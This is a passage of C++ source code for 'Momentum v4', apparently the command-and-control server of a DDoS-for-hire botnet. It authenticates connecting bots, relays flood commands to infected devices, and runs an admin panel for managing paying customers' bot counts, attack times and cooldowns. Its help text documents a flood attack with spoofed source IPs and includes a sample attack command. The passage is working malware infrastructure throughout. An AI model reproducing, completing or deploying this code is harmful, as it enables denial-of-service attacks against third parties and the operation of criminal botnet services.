            sprintf(banner3,  "\e[95m██\e[37m╔\e[95m████\e[37m╔\e[95m██\e[37m║\e[95m██████\e[37m╔╝\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║   \r\n");
            sprintf(banner4,  "\e[95m██\e[37m║╚\e[95m██\e[37m╔╝\e[95m██\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║  \r\n");
            sprintf(banner5,  "\e[95m██\e[37m║ ╚═╝ \e[95m██\e[37m║\e[95m██████\e[37m╔╝╚\e[95m██████\e[37m╔╝   \e[95m██\e[37m║   \r\n");
            sprintf(banner6,  "\e[37m╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n");
            sprintf(banner7,  "\t     \e[95mskidush\e[37m.\e[95mpw\r\n\r\n");

                send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
                send(fd, "\e[37mAvailable options for \e[95mesp\e[37m:\r\n", strlen("\e[37mAvailable options for \e[95mesp\e[37m:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mttl: \e[37mIP header TTL (default 255).\r\n", strlen("\e[95mttl: \e[37mIP header TTL (default 255).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mtos: \e[37mIP header TOS.\r\n", strlen("\e[95mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mid: \e[37mIP header ID (default random).\r\n", strlen("\e[95mid: \e[37mIP header ID (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n\r\n", strlen("\e[95msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[37m!esp 77.77.77.78 \e[95mport\e[37m=80 \e[95msource_ip\e[37m=198.27.92.1\r\n", strlen("\e[37m!esp 77.77.77.78 \e[95mport\e[37m=80 \e[95msource_ip\e[37m=198.27.92.1\r\n"), MSG_NOSIGNAL);
                continue;
            }

            if(data == "admin" && login.admin == 0){
                continue;
            }

            if(data == "admin" && login.admin == 1){
              send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
            sprintf(banner1,  "\e[95m███\e[37m╗   \e[95m███\e[37m╗\e[95m██████\e[37m╗  \e[95m██████\e[37m╗ \e[95m████████\e[37m╗\r\n");
            sprintf(banner2,  "\e[95m████\e[37m╗ \e[95m████\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m╔═══\e[95m██\e[37m╗╚══\e[95m██\e[37m╔══╝\r\n");
            sprintf(banner3,  "\e[95m██\e[37m╔\e[95m████\e[37m╔\e[95m██\e[37m║\e[95m██████\e[37m╔╝\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║   \r\n");
            sprintf(banner4,  "\e[95m██\e[37m║╚\e[95m██\e[37m╔╝\e[95m██\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║  \r\n");
            sprintf(banner5,  "\e[95m██\e[37m║ ╚═╝ \e[95m██\e[37m║\e[95m██████\e[37m╔╝╚\e[95m██████\e[37m╔╝   \e[95m██\e[37m║   \r\n");
            sprintf(banner6,  "\e[37m╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n");
            sprintf(banner7,  "\t     \e[95mskidush\e[37m.\e[95mpw\r\n\r\n");

                    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
                    send(fd, "\t\e[95mAdmin panel\r\n", strlen("\t\e[95mAdmin panel\r\n"), MSG_NOSIGNAL);

                    send(fd, "\r\n\e[37m- \e[37mCommand currently available \e[37m-\r\n", strlen("\r\n\e[37m- \e[37mCommand currently available \e[37m-\r\n"), MSG_NOSIGNAL);
                    
                    send(fd, "\e[95mclient stats             \e[37m-    \e[95msee all clients status\r\n",         strlen("\e[95mclient stats             \e[37m-    \e[95msee all clients status\r\n"), MSG_NOSIGNAL);
                    send(fd, "\e[95mclient add               \e[37m-    \e[95madd user in database\r\n",           strlen("\e[95mclient add               \e[37m-    \e[95madd user in database\r\n"), MSG_NOSIGNAL);
                    send(fd, "\e[95mclient remove            \e[37m-    \e[95mremove user in database\r\n",        strlen("\e[95mclient remove            \e[37m-    \e[95mremove user in database\r\n"), MSG_NOSIGNAL);
                    send(fd, "\e[95mclient update-bots       \e[37m-    \e[95mupdate user bots\r\n",               strlen("\e[95mclient update-bots       \e[37m-    \e[95mupdate user bots\r\n"), MSG_NOSIGNAL);
                    send(fd, "\e[95mclient update-conc       \e[37m-    \e[95mupdate user concurrent\r\n",         strlen("\e[95mclient update-conc       \e[37m-    \e[95mupdate user concurrent\r\n"), MSG_NOSIGNAL);
                    send(fd, "\e[95mclient update-time       \e[37m-    \e[95mupdate user time\r\n",               strlen("\e[95mclient update-time       \e[37m-    \e[95mupdate user time\r\n"), MSG_NOSIGNAL);
                    send(fd, "\e[95mcient update-cooldown    \e[37m-    \e[95mupdate user cooldown\r\n",           strlen("\e[95mcient update-cooldown    \e[37m-    \e[95mupdate user cooldown\r\n"), MSG_NOSIGNAL);
                    send(fd, "\e[95mclient <enable/disable>  \e[37m-    \e[95mban or un-ban user\r\n",             strlen("\e[95mclient <enable/disable>  \e[37m-    \e[95mban or un-ban user\r\n"), MSG_NOSIGNAL);
                    send(fd, "\e[95mclient logs              \e[37m-    \e[95msee all clients logs\r\n",           strlen("\e[95mclient logs              \e[37m-    \e[95msee all clients logs\r\n"), MSG_NOSIGNAL);
                    send(fd, "\e[95mattack debug             \e[37m-    \e[95msee all current running flood\r\n",  strlen("\e[95mattack debug             \e[37m-    \e[95msee all current running flood\r\n"), MSG_NOSIGNAL);
                    send(fd, "\e[95mkillall                  \e[37m-    \e[95minstant-kill all running flood\r\n", strlen("\e[95mkillall                  \e[37m-    \e[95minstant-kill all running flood\r\n"), MSG_NOSIGNAL);
                continue;
            }


        if (split(data, ' ').size() > 0 && login.admin == 1)
        {
            if (split(data, ' ')[0] == "client")
            {
                if (split(data, ' ').size() > 1)
                {

                    if(split(data, ' ')[1] == "show")
                    {
                        mysql_get_client_information(&login);
                        continue;
                    }

                    if(split(data, ' ')[1] == "enable" || split(data, ' ')[1] == "disable")
                    {
                        if (split(data, ' ').size() > 2)
                        {
                            if(strlen(split(data, ' ')[2].c_str()) > 0)
                            {
                                mysql_update_disable(&login, split(data, ' ')[2].c_str(), (split(data, ' ')[1] == "enable" ? 0 : 1));
                                continue;
                            }
                        }

                        std::string info = "Usage: enable/disable [username]\r\n";
                        send(fd, info.c_str(), info.length(), MSG_NOSIGNAL);
                    }

                    if(split(data, ' ')[1] == "add")
                    {
                        if (split(data, ' ').size() != 11)
                        {
                            std::string info = "Usage: client add [user] [pass] [max clients]\r[max time] [cooldown] [conc] 0 0\r\n";
                            send(fd, info.c_str(), info.length(), MSG_NOSIGNAL);
                            continue;
                        }
                        
                        mysql_add_user(&login, split(data, ' ')[2].c_str(), split(data, ' ')[3].c_str(), 
                                        atoi(split(data, ' ')[4].c_str()), atoi(split(data, ' ')[5].c_str()), 
                                            atoi(split(data, ' ')[6].c_str()), atoi(split(data, ' ')[7].c_str()), 
                                                atoi(split(data, ' ')[8].c_str()), atoi(split(data, ' ')[8].c_str()));

                    }

                    if(split(data, ' ')[1] == "update-bots")
                    {

                        if(split(data, ' ').size() != 3)
                        {
                            std::string info = "\033[37mUsage: client update [username] [bots count]\r\n";
                            send(fd, info.c_str(), info.length(), MSG_NOSIGNAL);
                            continue;
                        }
                        if (split(data, ' ')[2] == login.username)
                            continue;

                        mysql_update_users_bots(&login, split(data, ' ')[2].c_str(), atoi(split(data, ' ')[3].c_str()));

                    }

                    if(split(data, ' ')[1] == "update-time")
                    {

                        if(split(data, ' ').size() != 3)
                        {
                            std::string info = "\033[37mUsage: client update [username] [max boot time]\r\n";
                            send(fd, info.c_str(), info.length(), MSG_NOSIGNAL);
                            continue;
                        }
                        if (split(data, ' ')[2] == login.username)
                            continue;
                        
                        mysql_update_users_time(&login, split(data, ' ')[2].c_str(), atoi(split(data, ' ')[3].c_str()));

                    }

                    if(split(data, ' ')[1] == "update-conc")
                    {

                        if(split(data, ' ').size() != 3)
                        {
                            std::string info = "\033[37mUsage: client update [username] [concurrent]\r\n";
                            send(fd, info.c_str(), info.length(), MSG_NOSIGNAL);
                            continue;
                        }
                        if (split(data, ' ')[2] == login.username)
                            continue;

                        mysql_update_users_conc(&login, split(data, ' ')[2].c_str(), atoi(split(data, ' ')[3].c_str()));

                    }

                    if(split(data, ' ')[1] == "update-cooldown")
                    {

                        if(split(data, ' ').size() != 3)
                        {
                            std::string info = "\033[37mUsage: client update [username] [cooldown]\r\n";
                            send(fd, info.c_str(), info.length(), MSG_NOSIGNAL);
                            continue;
                        }
                        if (split(data, ' ')[2] == login.username)
                            continue;

                        mysql_update_users_cooldown(&login, split(data, ' ')[2].c_str(), atoi(split(data, ' ')[3].c_str()));

                    }

                    if(split(data, ' ')[1] == "remove")
                    {
                        if (split(data, ' ').size() != 3)
                        {
                            std::string info = "Usage: clients remove [username]\r\n";
                            send(fd, info.c_str(), info.length(), MSG_NOSIGNAL);
                            continue;
                        }

                        if (split(data, ' ')[2] == login.username)
                            continue;

                        mysql_remove_user(&login, split(data, ' ')[2].c_str());

                    }
                }

                continue;
            }

            if (split(data, ' ')[0] == "running")
            {
                if (split(data, ' ').size() > 1)
                {
                    if(split(data, ' ')[1] == "flood")
                    {   
                         std::string info = "running flood: \r\n";
                         send(fd, info.c_str(), info.length(), MSG_NOSIGNAL);
                        (fd);
                        continue;
                    }
                }

                continue;
            }
        }


        if(data == "bots" || data == "os")
        { 
            std::map<std::string, int> stats;
            std::map<std::string, int>::iterator stats_iterator;
            std::stringstream stats_stream;

            stats = statistics();

            if(stats.empty())
            {
                send(fd, "Bot count too low.\r\n", 20, MSG_NOSIGNAL);
                continue;
            }

            stats_stream << "\r\n";

            for(stats_iterator = stats.begin(); stats_iterator != stats.end(); stats_iterator++)
            {
                stats_stream << "\e[37m" << stats_iterator->first << "\e[37m: \e[95m" << stats_iterator->second;
                stats_stream << "\r\n";
            }

            stats_stream << "\r\n";

            send(fd, stats_stream.str().c_str(), stats_stream.str().length(), MSG_NOSIGNAL);
            continue;
        }

        if((data == "attacks enable"))
        {
            send(fd, "\e[32mAttacks has been enabled successfuly.\r\n", strlen("\e[32mAttacks has been enabled successfuly.\r\n"), MSG_NOSIGNAL);
            global_attack_status = TRUE;
            continue;
        }
        else if((data == "attacks disable"))
        {
            send(fd, "\e[95mAttacks has been disabled successfuly.\r\n", strlen("\e[95mAttacks has been disabled successfuly.\r\n"), MSG_NOSIGNAL);
            global_attack_status = FALSE;
            continue;
        } 
        else if(global_attack_status == FALSE)
        {
            send(fd, "\e[95mAttacks has been disabled for maintenance.\r\n", strlen("\e[95mAttacks has been disabled for maintenance.\r\n"), MSG_NOSIGNAL);
            continue;
        }
        //Flooding management END.

        if(count == 0)
        {
            //send(fd, "\033[37mNo clients connected to command\033[97m!\r\n", strlen("\033[37mNo clients connected to command\033[97m!\r\n"), MSG_NOSIGNAL);
            continue;
        }
        process.buf = data;
        process.buf_len = data.length();
        process.fd = fd;
        process.ptr = &login;
        process.count = login.max_clients;
        std::stringstream info_stream;

 
        if(data[0] == '¨¨')
        {
            if(!parse_count(&process))
            {
                send(fd, "Invalid count specified\r\n", strlen("Invalid count specified\r\n"), MSG_NOSIGNAL);
                continue;
            }
            process.buf = process.f;
        }

        //Check & Send attack
        if (running_attack < available_slots && running_attack_time == 0)
        {
            ptr = command_process(&process);
            if(!ptr)
            {
                continue;
            }

            flood(ptr, &process);
            running_attack = TRUE;
            available_slots++;
            slot_used++;
            running_attack_time = time(NULL);
            running_additional_timeout = login.cooldown;
        }
        else if(available_slots == 3) 
        {
            info_stream << "\r\n\t\033[31mAll slots ("<< slot_used <<"/"<< available_slots <<") are used please wait.\r\n";
            send(fd, info_stream.str().c_str(), info_stream.str().length(), MSG_NOSIGNAL);
            continue;
        }
        else
        {
            info_stream << "\r\n\t\033[31mPlease wait " << running_attack_time_elapsed << "/" << (FLOOD_TIMEOUT + running_additional_timeout) << " before launching new attack." << "\r\n";
            send(fd, info_stream.str().c_str(), info_stream.str().length(), MSG_NOSIGNAL);
            continue;
        }
        info_stream << "\n\033[37mCommand sent to \033[35m" << (process.count == -1 ? count : process.count) << "\033[37m devices, taking up slot \033[35m" << available_slots << "\033[37m\r\n";
        send(fd, info_stream.str().c_str(), info_stream.str().length(), MSG_NOSIGNAL);
        running_attack_count++;

        free(ptr->buf);
        free(ptr);
    } 

    //User close the CNC
    ConnectedUser--;
    mysql_update_login(&login, 0);
    pthread_cancel(counter);
    close(fd);
    pthread_exit(0);
}

static void accept_admin_connection(struct epoll_event *es, int efd)
{
    int fd = -1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    pthread_t thread;
    struct thread_data tdata;
    pthread_barrier_t barrier;

    fd = accept(es->data.fd, (struct sockaddr *)&addr, &addr_len);
    if(fd == -1)
        return;
    tdata.fd = fd;

    pthread_barrier_init(&barrier, NULL, 2);

    tdata.barrier = &barrier;
    tdata.admin_thread = &thread;

    pthread_create(&thread, NULL, admin, (void *)&tdata);

    pthread_barrier_wait(&barrier);
    pthread_barrier_destroy(&barrier);

    return;
}

static void verify_client(struct epoll_event *es, struct relay *data)
{
    uint16_t b1, b2, b3, b4, b5, b6 = 0;
    uint16_t len = 0;
    uint8_t core_count;

    char *buf;
    b1 = ntohs(data->b1);
    b2 = ntohs(data->b2);
    b3 = ntohs(data->b3);
    b4 = ntohs(data->b4);
    b5 = ntohs(data->b5);
    b6 = ntohs(data->b6);
    if(b1 != 66 && b2 != 51 && b3 != 99 && b4 != 456 && b5 != 764 && b6 != 73)
    {
        return;
    }
    buf = data->buf;
    len = *(uint16_t *)buf;
    len = ntohs(len);

    

    if(len > sizeof(data->buf))
    {
        return;
    }


    buf += sizeof(uint16_t);

    memcpy(&core_count, buf, sizeof(uint8_t)); 
    client_list[es->data.fd].core_count = core_count;
    
    client_list[es->data.fd].arch_len = len;
    memcpy(client_list[es->data.fd].arch, buf + 1 , client_list[es->data.fd].arch_len); 
    
    client_list[es->data.fd].authenticated = TRUE;
    printf("\033[37;1m[\033[32;1m+\033[37;1m] (\033[32;1m%d\033[37;1m.\033[32;1m%d\033[37;1m.\033[32;1m%d\033[37;1m.\033[32;1m%d\033[37;1m:\033[34;1m%s\033[37;1m) - \e[031m Core count: [%d]\033[37;1m) bots registered on tor node [\033[31;1m%d:%d\033[0m]\033[0m\n", client_list[es->data.fd].addr & 0xff, (client_list[es->data.fd].addr >> 8) & 0xff, (client_list[es->data.fd].addr >> 16) & 0xff, (client_list[es->data.fd].addr >> 24) & 0xff, client_list[es->data.fd].arch, client_list[es->data.fd].core_count, client_list[es->data.fd].fd, ADMIN_PORT);
    return;
}



static void parse_command(int fd, struct relay *data)
{
    uint16_t b1, b2, b3, b4, b5, b6 = 0;

    b1 = ntohs(data->b1);
    b2 = ntohs(data->b2);
    b3 = ntohs(data->b3);
    b4 = ntohs(data->b4);
    b5 = ntohs(data->b5);
    b6 = ntohs(data->b6);

    if(b1 == 8890 && b2 == 5412 && b3 == 6767 && b4 == 1236 && b5 == 8092 && b6 == 3334)
    {
        send(fd, data, sizeof(struct relay), MSG_NOSIGNAL);
    }

    return;
}

static void process_event(struct epoll_event *es, int efd)
{
    int len = 0;
    struct relay data;

    memset(&data, 0, sizeof(struct relay));

    if((es->events & EPOLLERR) || (es->events & EPOLLHUP) || (!(es->events & EPOLLIN)))
    {
        printf("\e[95m[-]\e[37m Connection terminated. (%d.%d.%d.%d)\n", client_list[es->data.fd].addr & 0xff, (client_list[es->data.fd].addr >> 8) & 0xff, (client_list[es->data.fd].addr >> 16) & 0xff, (client_list[es->data.fd].addr >> 24) & 0xff);
        terminate_client(es->data.fd);
        return;
    }

    if(es->data.fd == admin_fd)
    {
        accept_admin_connection(es, efd);
        return;
    }

    if(es->data.fd == client_fd)
    {
        accept_client_connection(es, efd);
        return;
    }

    errno = 0;
    // Always read in
    len = recv(es->data.fd, &data, sizeof(struct relay), MSG_NOSIGNAL);

    if(len <= 0)
    {
        terminate_client(es->data.fd);
        return;
    }

    if(data.type == TYPE_AUTH && !client_list[es->data.fd].authenticated)
    {
        verify_client(es, &data);
    }

    if(!client_list[es->data.fd].authenticated)
    {
        terminate_client(es->data.fd);
        return;
    }

    client_list[es->data.fd].timeout = time(NULL);

    if(data.type == TYPE_COMMAND)
    {
        parse_command(es->data.fd, &data);
    }

    return;
}

static void *client_timeout(void *arg)
{
    int i = 0;

    while(TRUE)
    {
        for(i = 0; i < MAX_BOTS; i++)
        {
            if(!client_list[i].connected || !client_list[i].authenticated)
                continue;
            /*if(!client_list[i].authenticated && client_list[i].timeout + VERIFY_TIMEOUT < time(NULL))
            {
                printf("Client timed out on the verification process (%d.%d.%d.%d)\n", client_list[i].addr & 0xff, (client_list[i].addr >> 8) & 0xff, (client_list[i].addr >> 16) & 0xff, (client_list[i].addr >> 24) & 0xff);
                terminate_client(client_list[i].fd);
                continue;
            }*/
            if(client_list[i].timeout + TIMEOUT < time(NULL))
            {
                //printf("\e[95m[-]\e[37m Connection timeout. (%d.%d.%d.%d)\n", client_list[i].addr & 0xff, (client_list[i].addr >> 8) & 0xff, (client_list[i].addr >> 16) & 0xff, (client_list[i].addr >> 24) & 0xff);
                terminate_client(client_list[i].fd);
                continue;
            }
        }

        sleep(1);
    }
}

static void client_bind(void)
{
    struct sockaddr_in addr;
    int ret = 0;

    client_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(!client_fd)
    {
        _exit("Failed to create a TCP socket", 1);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(CLIENT_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    NONBLOCK(client_fd);
    REUSE_ADDR(client_fd);

    ret = bind(client_fd, (struct sockaddr *)&addr, sizeof(addr));
    if(ret)
    {
        _exit("Failed to bind to the client port", 1);
    }

    ret = listen(client_fd, 0);
    if(ret)
    {
        _exit("Failed to listen on the client port", 1);
    }

    return;
}

static void epoll_handler(void)
{
    int ret = -1;
    int x = 0;
    //int efd = -1;
    struct epoll_event client_event;
    struct epoll_event admin_event;
    struct epoll_event *es;
    pthread_t client_timeout_thread;
    pthread_t flood_timeout_thread;

    efd = epoll_create1(0);
    if(efd == -1)
    {
        _exit("Failed to create the epoll fd", 1);
    }
    client_event.data.fd = client_fd;
    client_event.events = EPOLLIN | EPOLLET;
    ret = epoll_ctl(efd, EPOLL_CTL_ADD, client_fd, &client_event);
    if(ret)
    {
        _exit("Failed to add the fd to epoll", 1);
    }
    admin_event.data.fd = admin_fd;
    admin_event.events = EPOLLIN | EPOLLET;
    ret = epoll_ctl(efd, EPOLL_CTL_ADD, admin_fd, &admin_event);
    if(ret)
    {
        _exit("Failed to add the fd to epoll", 1);
    }
    client_list = (struct clients *)calloc(MAX_BOTS, sizeof(struct clients));
    if(!client_list)
    {
        _exit("Failed to allocate memory for the client list", 1);;
    }

    for(x = 0; x < MAX_BOTS; x++)
    {
        client_list[x].fd = -1;
        client_list[x].connected = FALSE;
        client_list[x].addr = 0;
        client_list[x].authenticated = FALSE;
        client_list[x].timeout = 0;
        client_list[x].arch_len = 0;
        memset(client_list[x].arch, 0, 64);
    }

    es = (struct epoll_event *)calloc(MAX_BOTS, sizeof(struct epoll_event));
    if(!es)
    {
        _exit("Failed to allocate memory for the epoll events", 1);
    }
    pthread_create(&client_timeout_thread, NULL, client_timeout, NULL);
    pthread_create(&flood_timeout_thread, NULL, flood_timeout, NULL);

    while(TRUE)
    {
        int n = 0;
        int i = 0;
        int cfd = -1;

        n = epoll_wait(efd, es, MAX_BOTS, -1);
        if(n == -1)
        {
            std::cout << "Epoll error" << std::endl;
            break;
        }

        for(i = 0; i < n; i++)
            process_event(&es[i], efd);
    }

    free(es);
    free(client_list);
    close(efd);
    _exit("Epoll finished", 1);
}

int main(void)
{
    std::cout << "\e[37m-== \e[0m\e[95mMomentum v4 \e[37m- \e[32mCNC Opened \e[37m==-" << std::endl;
    std::cout << "\r\n- \e[37mBot port: \e[37m" << CLIENT_PORT;
    std::cout << "\r\n- \e[37mAdmin port: \e[37m" << ADMIN_PORT << " \r\n (\e[32mCNC Server | Connection: \e[0m\e[95mRAW\e[37m)\r\n- \e[37mLogin KEY: \e[37m" << MANAGER_AUTH_KEY << std::endl;
   
    mysql_clear_login();
    client_bind();
    admin_bind();
    epoll_handler();
    return 0;
}
